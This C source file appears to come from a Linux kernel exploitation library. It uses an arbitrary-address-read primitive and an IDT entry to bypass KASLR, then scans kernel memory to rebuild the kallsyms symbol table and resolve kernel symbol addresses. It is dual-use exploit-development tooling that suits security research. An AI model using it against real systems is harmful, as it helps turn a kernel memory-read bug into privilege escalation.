/*
 * Strongly influenced by https://github.com/marin-m/vmlinux-to-elf and https://github.com/bata24/gef
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#include <uallsyms/types.h>

#include "core.h"
#include "utils/log.h"
#include "arch/x86_64/kbase.h"

static struct kallsyms_elem *alloc_kallsyms_elem(void)
{
    struct kallsyms_elem *elem;

    elem = malloc(sizeof(*elem));
    if (!elem) {
        pr_err("[alloc_kallsyms_elem] elem == NULL\n");
        return NULL;
    }

    elem->addr = UNKNOWN_KADDR;
    elem->type = 0;
    elem->name = NULL;

    return elem;
}

static kaddr_t resolve_kallsyms_token_table(uas_t *uas)
{
    kaddr_t div_by_0_handler;
    kaddr_t entry_text_base;
    kaddr_t cur_page;
    kaddr_t kallsyms_token_table;
    u8 *candidate;
    u8 tmp[PAGE_SIZE];
    u8 *tmp_kallsyms_token_table;
    u8 *cur_token;
    int ret;

    if (uas->kallsyms_cache.initialized && uas->kallsyms_cache.kallsyms_token_table != UNKNOWN_KADDR)
        return uas->kallsyms_cache.kallsyms_token_table;

    /* 
     * 먼저 AAR 취약점이 Invalid한 주소를 참조하면 에러를 반환할 수 있기 때문에, 
     * KASLR의 영향을 받지 않는 IDT Entry를 이용해 __entry_text_start + α의 주소를 가져온다.
     * 
     * 대략적인 Kernel Memory Map (KPTI가 enable 되었을 때, 하지만 disable 되어도 각 page의 global flag정도만 다르고 크게 다른게 없다.)
     * _text                [R-X KERN ACCESSED]
     * __entry_text_start   [R-X KERN ACCESSED GLOBAL]
     * __start_rodata       [R-- KERN ACCESSED]
     * __end_rodata         
     * HOLE
     * _sdata, init_stack   [RW- KERN ACCESSED DIRTY]
     * 
     * kallsyms_token_table이 있는 rodata 영역은 __entry_text_start 이후에 있기에 
     * kallsyms_token_table를 이후 메모리를 순회하며 찾는다.
     */
    div_by_0_handler = x86_64_resolve_div_by_0_handler(uas);
    if (div_by_0_handler == UNKNOWN_KADDR)
        return UNKNOWN_KADDR;

    pr_debug("[resolve_kallsyms_token_table] div_by_0_handler: %#lx\n", div_by_0_handler);

    entry_text_base = div_by_0_handler & ~(PAGE_SIZE - 1);

    pr_debug("[resolve_kallsyms_token_table] entry_text_base: %#lx\n", entry_text_base);

    for (cur_page = entry_text_base; 
        cur_page <= entry_text_base + 0x2000000; 
        cur_page += PAGE_SIZE) {
        ret = uas_aar(uas, tmp, cur_page, PAGE_SIZE);
        if (ret < 0)
            return UNKNOWN_KADDR;
        
        candidate = memmem(tmp, PAGE_SIZE, UNIQUE_SEQS, sizeof(UNIQUE_SEQS) - 1);
        if (!candidate)
            continue;
        
        if (candidate[sizeof(UNIQUE_SEQS) - 1] != 0x3a)
            break;

        candidate = NULL;
    }

    if (!candidate)
        return UNKNOWN_KADDR;

    tmp_kallsyms_token_table = NULL;
    for (u8 *cur = candidate; tmp <= cur; cur--) {
        if (cur[0] == 0 && cur[1] == 0) {
            tmp_kallsyms_token_table = cur;
            break;
        } 
    }

    kallsyms_token_table = cur_page + (tmp_kallsyms_token_table - tmp + 2);

    ret = uas_aar(uas, tmp, kallsyms_token_table, PAGE_SIZE);
    if (ret < 0)
        return UNKNOWN_KADDR;
    
    cur_token = tmp;
    for (int i = 0; i < 0x100; i++) {
        uas->kallsyms_cache.kallsyms_tokens[i] = strdup(cur_token);

        cur_token += strlen(cur_token) + 1;
    }
    
    pr_debug("[resolve_kallsyms_token_table] kallsyms_token_table: %#lx\n", kallsyms_token_table);

    return kallsyms_token_table;
}

static kaddr_t resolve_kallsyms_token_index(uas_t *uas)
{
    kaddr_t kallsyms_token_table_page;
    kaddr_t kallsyms_token_table;
    kaddr_t kallsyms_token_index;
    kaddr_t cur_page;
    u16 seqs_to_find[10];
    u16 off;
    u8 tmp[PAGE_SIZE];
    u8 *tmp_kallsyms_token_idx;
    int ret;

    if (uas->kallsyms_cache.initialized && uas->kallsyms_cache.kallsyms_token_table != UNKNOWN_KADDR)
        return uas->kallsyms_cache.kallsyms_token_index;

    kallsyms_token_table = uas->kallsyms_cache.kallsyms_token_table;
    if (kallsyms_token_table == UNKNOWN_KADDR) {
        pr_err("[resolve_kallsyms_token_index] uas->kallsyms_cache.kallsyms_token_table == UNKNOWN_KADDR");
        return UNKNOWN_KADDR;
    }

    ret = uas_aar(uas, tmp, kallsyms_token_table, PAGE_SIZE);
    if (ret < 0)
        return UNKNOWN_KADDR;

    memset(seqs_to_find, 0, sizeof(seqs_to_find));

    off = 0;
    for (int i = 0; i < sizeof(seqs_to_find) / sizeof(*seqs_to_find); i++) {
        seqs_to_find[i] = off;
        off += strlen(tmp + off) + 1;
    }

    pr_debug("[resolve_kallsyms_token_index] seqs_to_find: %04hx %04hx %04hx %04hx %04hx %04hx %04hx %04hx %04hx %04hx\n", 
                seqs_to_find[0], seqs_to_find[1], seqs_to_find[2], seqs_to_find[3], seqs_to_find[4],
                seqs_to_find[5], seqs_to_find[6], seqs_to_find[7], seqs_to_find[8], seqs_to_find[9]);

    kallsyms_token_table_page = kallsyms_token_table & ~(PAGE_SIZE - 1);
    for (cur_page = kallsyms_token_table_page; 
        cur_page <= kallsyms_token_table_page + 0x10000; 
        cur_page += PAGE_SIZE) {
        ret = uas_aar(uas, tmp, cur_page, PAGE_SIZE);
        if (ret < 0)
            return UNKNOWN_KADDR;
        
        tmp_kallsyms_token_idx = memmem(tmp, PAGE_SIZE, seqs_to_find, sizeof(seqs_to_find) - 1);
        if (tmp_kallsyms_token_idx)
            break;
    }

    kallsyms_token_index = cur_page + (tmp_kallsyms_token_idx - tmp);

    pr_debug("[resolve_kallsyms_token_index] kallsyms_token_index: %#lx\n", kallsyms_token_index);

    return kallsyms_token_index;
}

static kaddr_t resolve_kallsyms_markers(uas_t *uas)
{
    kaddr_t kallsyms_token_table;
    kaddr_t kallsyms_markers;
    u8 tmp[PAGE_SIZE];
    u32 *tmp_kallsyms_markers;
    int ret;

    if (uas->kallsyms_cache.initialized && uas->kallsyms_cache.kallsyms_markers != UNKNOWN_KADDR)
        return uas->kallsyms_cache.kallsyms_markers;

    kallsyms_token_table = uas->kallsyms_cache.kallsyms_token_table;
    if (kallsyms_token_table == UNKNOWN_KADDR) {
        pr_err("[resolve_kallsyms_markers] uas->kallsyms_cache.kallsyms_token_table == UNKNOWN_KADDR");
        return UNKNOWN_KADDR;
    }

    ret = uas_aar(uas, tmp, kallsyms_token_table - PAGE_SIZE, PAGE_SIZE);
    if (ret < 0)
        return UNKNOWN_KADDR;

    tmp_kallsyms_markers = memmem(tmp, PAGE_SIZE, "\0\0\0\0", 4);

    if (tmp_kallsyms_markers[1] == 0)
        tmp_kallsyms_markers = tmp_kallsyms_markers + 1;
    
    kallsyms_markers = (kallsyms_token_table - PAGE_SIZE) + ((u8 *)tmp_kallsyms_markers - tmp);
    pr_debug("[resolve_kallsyms_markers] kallsyms_markers: %#lx\n", kallsyms_markers);

    return kallsyms_markers;
}

static kaddr_t resolve_kallsyms_names(uas_t *uas)
{
    kaddr_t kallsyms_token_table;
    kaddr_t kallsyms_markers;
    kaddr_t kallsyms_markers_end;
    kaddr_t kallsyms_names;
    u32 kallsyms_markers_last_entry;
    u32 kallsyms_names_len; 
    u8 tmp[PAGE_SIZE * 4];
    u8 *cur;
    u8 *kallsyms_names_content;
    int ret;

    if (uas->kallsyms_cache.initialized && uas->kallsyms_cache.kallsyms_names != UNKNOWN_KADDR)
        return uas->kallsyms_cache.kallsyms_names;

    kallsyms_token_table = uas->kallsyms_cache.kallsyms_token_table;
    if (kallsyms_token_table == UNKNOWN_KADDR) {
        pr_err("[resolve_kallsyms_names] uas->kallsyms_cache.kallsyms_token_table == UNKNOWN_KADDR");
        return UNKNOWN_KADDR;
    }

    kallsyms_markers_end = kallsyms_token_table - sizeof(int);

    while (1) {
        ret = uas_aar(uas, &kallsyms_markers_last_entry, kallsyms_markers_end, sizeof(kallsyms_markers_last_entry));
        if (ret < 0)
            return UNKNOWN_KADDR;

        if (kallsyms_markers_last_entry)
            break;
        
        kallsyms_markers_end -= sizeof(int);
    }
    
    pr_debug("[resolve_kallsyms_names] kallsyms_markers_end: %#lx\n", kallsyms_markers_end);
    pr_debug("[resolve_kallsyms_names] kallsyms_markers_last_entry: %#x\n", kallsyms_markers_last_entry);

    kallsyms_markers = uas->kallsyms_cache.kallsyms_markers;
    if (kallsyms_token_table == UNKNOWN_KADDR) {
        pr_err("[resolve_kallsyms_names] uas->kallsyms_cache.kallsyms_markers == UNKNOWN_KADDR");
        return UNKNOWN_KADDR;
    }

    kallsyms_names = kallsyms_markers - kallsyms_markers_last_entry;
    pr_debug("[resolve_kallsyms_names] kallsyms_names ≈ %#lx\n", kallsyms_names);

    ret = uas_aar(uas, tmp, kallsyms_names - sizeof(tmp), sizeof(tmp));
    if (ret < 0)
        return UNKNOWN_KADDR;
    
    for (cur = tmp + sizeof(tmp) - 4; cur >= tmp; cur -= 1) {
        if (cur[0] == 0 && cur[1] == 0 && cur[2] == 0 && cur[3] == 0)
            break;
    }

    kallsyms_names = kallsyms_names - (sizeof(tmp) - (cur - tmp)) + 4;

    kallsyms_names_len = kallsyms_markers - kallsyms_names;
    kallsyms_names_content = malloc(kallsyms_names_len);
    if (!kallsyms_names_content) {
        pr_err("[resolve_kallsyms_names] kallsyms_names_content == NULL\n");
        return UNKNOWN_KADDR;
    }

    ret = uas_aar(uas, kallsyms_names_content, kallsyms_names, kallsyms_names_len);
    if (ret < 0)
        return UNKNOWN_KADDR;

    uas->kallsyms_cache.kallsyms_names_content = kallsyms_names_content;

    pr_debug("[resolve_kallsyms_names] kallsyms_names: %#lx\n", kallsyms_names);

    return kallsyms_names;
}

static u32 resolve_kallsyms_num_syms(uas_t *uas)
{
    kaddr_t kallsyms_names;
    u32 kallsyms_num_syms;
    int ret;

    if (uas->kallsyms_cache.initialized && uas->kallsyms_cache.kallsyms_num_syms != UNKNOWN_KADDR)
        return uas->kallsyms_cache.kallsyms_num_syms;

    kallsyms_names = uas->kallsyms_cache.kallsyms_names;
    if (kallsyms_names == UNKNOWN_KADDR) {
        pr_err("[resolve_kallsyms_num_syms] uas->kallsyms_cache.kallsyms_names == UNKNOWN_KADDR");
        return 0;
    }

    ret = uas_aar(uas, &kallsyms_num_syms, kallsyms_names - sizeof(int) * 2, sizeof(kallsyms_num_syms));
    if (ret < 0)
        return 0;

    pr_debug("[resolve_kallsyms_num_syms] kallsyms_num_syms: %#x\n", kallsyms_num_syms);

    return kallsyms_num_syms;
}

static kaddr_t resolve_kallsyms_offsets(uas_t *uas)
{
    kaddr_t kallsyms_offsets;
    kaddr_t kallsyms_token_index;

    if (uas->kallsyms_cache.initialized && uas->kallsyms_cache.kallsyms_offsets != UNKNOWN_KADDR)
        return uas->kallsyms_cache.kallsyms_offsets;

    kallsyms_token_index = uas->kallsyms_cache.kallsyms_token_index;
    if (kallsyms_token_index == UNKNOWN_KADDR) {
        pr_err("[resolve_kallsyms_offsets] uas->kallsyms_cache.kallsyms_token_index == UNKNOWN_KADDR");
        return 0;
    }

    kallsyms_offsets = kallsyms_token_index + sizeof(short) * 0x100;
    pr_debug("[resolve_kallsyms_offsets] kallsyms_offsets: %#lx\n", kallsyms_offsets);

    return kallsyms_offsets;
}

static kaddr_t resolve_kallsyms_relative_base(uas_t *uas)
{
    kaddr_t kallsyms_offsets;
    kaddr_t kallsyms_relative_base_ptr;
    kaddr_t kallsyms_relative_base;
    u32 kallsyms_num_syms;
    int ret;

    if (uas->kallsyms_cache.initialized && uas->kallsyms_cache.kallsyms_relative_base != UNKNOWN_KADDR)
        return uas->kallsyms_cache.kallsyms_relative_base;

    kallsyms_offsets = uas->kallsyms_cache.kallsyms_offsets;
    if (kallsyms_offsets == UNKNOWN_KADDR) {
        pr_err("[resolve_kallsyms_relative_base] uas->kallsyms_cache.kallsyms_offsets == UNKNOWN_KADDR");
        return UNKNOWN_KADDR;
    }

    kallsyms_num_syms = uas->kallsyms_cache.kallsyms_num_syms;
    if (kallsyms_num_syms == 0) {
        pr_err("[resolve_kallsyms_relative_base] uas->kallsyms_cache.kallsyms_num_syms == 0");
        return UNKNOWN_KADDR;
    }

    kallsyms_relative_base_ptr = kallsyms_offsets + ALIGN(kallsyms_num_syms * sizeof(int), 8);
    pr_debug("[resolve_kallsyms_relative_base] kallsyms_relative_base_ptr: %#lx\n", kallsyms_relative_base_ptr);

    ret = uas_aar(uas, &kallsyms_relative_base, kallsyms_relative_base_ptr, sizeof(kallsyms_relative_base));
    if (ret < 0)
        return UNKNOWN_KADDR;

    pr_debug("[resolve_kallsyms_relative_base] kallsyms_relative_base: %#lx\n", kallsyms_relative_base);

    return kallsyms_relative_base;
}

static int resolve_kallsyms_address_list(uas_t *uas)
{
    int *offsets;
    u32 kallsyms_offsets_len;
    kaddr_t *kallsyms_address_list;
    int ret;

    if (uas->kallsyms_cache.kallsyms_address_list)
        return 0;
    
    kallsyms_address_list = malloc(uas->kallsyms_cache.kallsyms_num_syms * sizeof(*kallsyms_address_list));
    if (!kallsyms_address_list) {
        pr_err("[resolve_kallsyms_address_list] kallsyms_address_list == NULL\n");
        return -1;
    }

    kallsyms_offsets_len = uas->kallsyms_cache.kallsyms_num_syms * sizeof(*offsets);
    offsets = malloc(kallsyms_offsets_len);
    if (!offsets) {
        pr_err("[resolve_kallsyms_address_list] offsets == NULL\n");
        return -1;
    }

    ret = uas_aar(uas, offsets, uas->kallsyms_cache.kallsyms_offsets, kallsyms_offsets_len);
    if (ret < 0)
        return -1;

    for (int i = 0; i < uas->kallsyms_cache.kallsyms_num_syms; i++) {
        if (offsets[i] < 0)
            kallsyms_address_list[i] = uas->kallsyms_cache.kallsyms_relative_base - offsets[i] - 1;
        else
            kallsyms_address_list[i] = uas->kallsyms_cache.kallsyms_relative_base + offsets[i];
    }
    
    uas->kallsyms_cache.kallsyms_address_list = kallsyms_address_list;

    free(offsets);

    return 0;
}

static int resolve_kallsyms_elems(uas_t *uas)
{
    u32 name_len;
    u32 pos;
    u32 token_index;
    u8 *kallsyms_names_content;
    struct kallsyms_elem *elem;
    struct kallsyms_elem **kallsyms_elems;
    char type;
    char *token;
    char name[UINT16_MAX];

    if (uas->kallsyms_cache.kallsyms_elems)
        return 0;

    kallsyms_elems = malloc(sizeof(*uas->kallsyms_cache.kallsyms_elems) * uas->kallsyms_cache.kallsyms_num_syms);
    if (!kallsyms_elems) {
        pr_err("[resolve_kallsyms_elems] kallsyms_elems == NULL\n");
        return -1;
    }

    kallsyms_names_content = uas->kallsyms_cache.kallsyms_names_content;

    pos = 0;
    for (int i = 0; i < uas->kallsyms_cache.kallsyms_num_syms; i++) {
        memset(name, 0, sizeof(name));
        name_len = kallsyms_names_content[pos++];

        if (uas->kallsyms_cache.may_use_big_symbol && name_len & 0x80)
            name_len = (kallsyms_names_content[pos++] << 7) | (name_len & 0x7f);
        
        token_index = kallsyms_names_content[pos++];
        token = uas->kallsyms_cache.kallsyms_tokens[token_index];
        type = *token;

        for (int j = 1; j < name_len; j++) {
            token_index = kallsyms_names_content[pos++];

            token = uas->kallsyms_cache.kallsyms_tokens[token_index];
            strcat(name, token);
        }

        elem = alloc_kallsyms_elem();
        if (!elem)
            return -1;

        elem->addr = uas->kallsyms_cache.kallsyms_address_list[i];
        elem->type = type;
        elem->name = strdup(name);

        kallsyms_elems[i] = elem;
    }

    uas->kallsyms_cache.kallsyms_elems = kallsyms_elems;

    return 0;
}

static int init_kallsyms_cache(uas_t *uas)
{
    kaddr_t kaddr;
    u32 kallsyms_num_syms;
    DEFINE_KVER(min_supported_kver, 6, 6, 0); /* 현재 Linux 6.6.0 이상에 대해서만 확인된 상태 */

    if (uas->kallsyms_cache.initialized)
        return 0;

    if (kver_gt(min_supported_kver, uas->kver)) {
        pr_warn("[init_kallsyms_cache] current_version(%d.%d.%d) VS min_supported_version(%d.%d.%d)\n", 
                uas->kver.version, uas->kver.sub_level, uas->kver.patch_level,
                min_supported_kver.version, min_supported_kver.sub_level, min_supported_kver.patch_level);
        return UNKNOWN_KADDR;
    }

    kaddr = resolve_kallsyms_token_table(uas);
    if (kaddr == UNKNOWN_KADDR)
        return -1;

    uas->kallsyms_cache.kallsyms_token_table = kaddr;

    kaddr = resolve_kallsyms_token_index(uas);
    if (kaddr == UNKNOWN_KADDR)
        return -1;

    uas->kallsyms_cache.kallsyms_token_index = kaddr;

    kaddr = resolve_kallsyms_markers(uas);
    if (kaddr == UNKNOWN_KADDR)
        return -1;

    uas->kallsyms_cache.kallsyms_markers = kaddr;

    kaddr = resolve_kallsyms_names(uas);
    if (kaddr == UNKNOWN_KADDR)
        return -1;

    uas->kallsyms_cache.kallsyms_names = kaddr;

    kallsyms_num_syms = resolve_kallsyms_num_syms(uas);
    if (kallsyms_num_syms == 0)
        return -1;

    uas->kallsyms_cache.kallsyms_num_syms = kallsyms_num_syms;

    kaddr = resolve_kallsyms_offsets(uas);
    if (kaddr == UNKNOWN_KADDR)
        return -1;

    uas->kallsyms_cache.kallsyms_offsets = kaddr;

    kaddr = resolve_kallsyms_relative_base(uas);
    if (kaddr == UNKNOWN_KADDR)
        return -1;

    uas->kallsyms_cache.kallsyms_relative_base = kaddr;

    if (resolve_kallsyms_address_list(uas) < 0)
        return -1;
    
    if (resolve_kallsyms_elems(uas) < 0)
        return -1;

    uas->kallsyms_cache.initialized = true;
    
    return 0;
}

kaddr_t kallsyms_lookup_name(uas_t *uas, const char *name)
{
    int ret;
    struct kallsyms_elem *cur_elem;

    if (!uas->kallsyms_cache.initialized) 
        ret = init_kallsyms_cache(uas);

    if (!uas->kallsyms_cache.initialized) {
        pr_err("[kallsyms_lookup_name] failed to initialze kallsyms_cache: %d\n", ret);
        return UNKNOWN_KADDR;
    }

    for (u32 i = 0; i < uas->kallsyms_cache.kallsyms_num_syms; i++) {
        cur_elem = uas->kallsyms_cache.kallsyms_elems[i];

        if (!strcmp(cur_elem->name, name))
            return cur_elem->addr;
    }

    return UNKNOWN_KADDR;
}
